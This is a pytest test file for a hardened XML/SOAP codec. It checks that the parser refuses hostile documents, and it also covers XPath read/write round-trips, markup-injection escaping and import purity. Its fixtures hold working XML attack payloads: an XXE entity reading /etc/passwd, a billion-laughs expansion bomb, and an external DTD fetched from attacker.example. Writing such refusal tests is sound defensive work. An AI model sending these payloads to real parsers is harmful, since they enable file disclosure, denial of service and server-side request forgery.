# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 MessageFoundry Organization and contributors
"""Pure XML/SOAP codec (messagefoundry.parsing.xml) — hardened lxml parse (XXE / entity-expansion /
external-DTD all refused), namespace-aware XPath read/set round-trip, and the console-carve-out
import-purity guard (BACKLOG #31)."""

from __future__ import annotations

import subprocess
import sys

import pytest

pytest.importorskip("lxml")

from messagefoundry.parsing.xml import (  # noqa: E402 - after importorskip
    XmlMessage,
    XmlParseError,
    XmlPathError,
    XmlSecurityError,
    parse_bytes,
)

# --- hardened parser: attacks refused ----------------------------------------

# Classic XXE: an external general entity reading a local file.
_XXE = b"""<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>"""

# Billion-laughs: nested internal entities that expand exponentially.
_BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"""

# External DTD reference (SSRF surface).
_EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd">
<root>hi</root>"""


@pytest.mark.parametrize("payload", [_XXE, _BILLION_LAUGHS, _EXTERNAL_DTD])
def test_doctype_bearing_payloads_are_refused(payload: bytes) -> None:
    # Every one carries a DOCTYPE — the hardened parser refuses the document outright.
    with pytest.raises(XmlSecurityError):
        parse_bytes(payload)
    with pytest.raises(XmlSecurityError):
        XmlMessage.parse(payload)


def test_non_wellformed_raises_parse_error() -> None:
    with pytest.raises(XmlParseError):
        XmlMessage.parse(b"<root><unclosed></root>")


def test_xxe_value_never_resolves_even_if_doctype_slipped_through() -> None:
    # Defense in depth: resolve_entities=False means a custom entity reference is not expanded. Even a
    # doctype-free doc referencing an undefined entity must not pull in external content.
    msg = XmlMessage.parse(b"<root>plain</root>")
    assert msg.get("/root/text()") == "plain"


# --- XPath read / set round-trip ---------------------------------------------

_NS = {"p": "urn:example:patient"}
_DOC = (
    b'<?xml version="1.0"?>'
    b'<p:Patient xmlns:p="urn:example:patient" status="draft">'
    b"<p:id>12345</p:id>"
    b"<p:name>Doe</p:name>"
    b"<p:name>Smith</p:name>"
    b"</p:Patient>"
)


def test_xpath_read() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    assert msg.get("//p:id/text()") == "12345"
    assert msg.get("/p:Patient/@status") == "draft"
    assert msg.get_all("//p:name/text()") == ["Doe", "Smith"]
    assert msg.exists("//p:id") is True
    assert msg.exists("//p:absent") is False


def test_xpath_set_element_text_round_trips() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    msg.set("//p:id", "99999")
    again = XmlMessage.parse(msg.encode(), namespaces=_NS)
    assert again.get("//p:id/text()") == "99999"
    # Namespace prefix is preserved on re-encode.
    assert b"p:Patient" in msg.encode()


def test_set_attribute_round_trips() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    msg.set_attribute("/p:Patient", "status", "active")
    assert XmlMessage.parse(msg.encode(), namespaces=_NS).get("/p:Patient/@status") == "active"


def test_set_value_cannot_inject_markup() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    msg.set("//p:id", "<evil>injected</evil>")
    # The injected markup is escaped as text, not parsed as a child element.
    reparsed = XmlMessage.parse(msg.encode(), namespaces=_NS)
    assert reparsed.get("//p:id/text()") == "<evil>injected</evil>"
    assert reparsed.exists("//p:id/evil") is False


def test_set_requires_exactly_one_element() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    with pytest.raises(XmlPathError):
        msg.set("//p:name", "x")  # matches two
    with pytest.raises(XmlPathError):
        msg.set("//p:absent", "x")  # matches zero


def test_invalid_xpath_raises_path_error() -> None:
    msg = XmlMessage.parse(_DOC, namespaces=_NS)
    with pytest.raises(XmlPathError):
        msg.get("//[broken(")


# --- console-carve-out purity: the codec imports no engine package -----------


def test_parsing_xml_pulls_no_heavy_engine_or_gui_modules() -> None:
    """Importing parsing.xml must NOT pull in the engine internals or the GUI (CLAUDE.md §4 carve-out):
    no pipeline/store/transports/api/console. (``config`` is excluded here because the root
    ``messagefoundry/__init__`` imports config *models* unconditionally — a baseline shared by all of
    parsing/; that xml's own sources don't import config is enforced by the static test below.)"""
    code = (
        "import sys, messagefoundry.parsing.xml as _;"
        "heavy=('messagefoundry.pipeline','messagefoundry.store','messagefoundry.transports',"
        "'messagefoundry.api','messagefoundry.console');"
        "bad=sorted(m for m in sys.modules if m.startswith(heavy));"
        "print('\\n'.join(bad));"
        "sys.exit(1 if bad else 0)"
    )
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert result.returncode == 0, f"parsing.xml pulled heavy engine/GUI modules:\n{result.stdout}"


def test_parsing_xml_sources_import_no_engine_packages() -> None:
    """Every parsing.xml module must import zero engine packages (config included) so the codec stays
    a pure, console-importable library."""
    import pathlib

    import messagefoundry.parsing.xml as pkg

    forbidden = (
        "messagefoundry.config",
        "messagefoundry.transports",
        "messagefoundry.pipeline",
        "messagefoundry.store",
        "messagefoundry.api",
        "messagefoundry.console",
    )
    offenders: list[str] = []
    for module_file in sorted(pathlib.Path(pkg.__file__).parent.glob("*.py")):
        for line in module_file.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            for pkg_name in forbidden:
                if stripped.startswith((f"import {pkg_name}", f"from {pkg_name}")):
                    offenders.append(f"{module_file.name}: {stripped}")
    assert not offenders, "parsing.xml sources import engine packages:\n" + "\n".join(offenders)
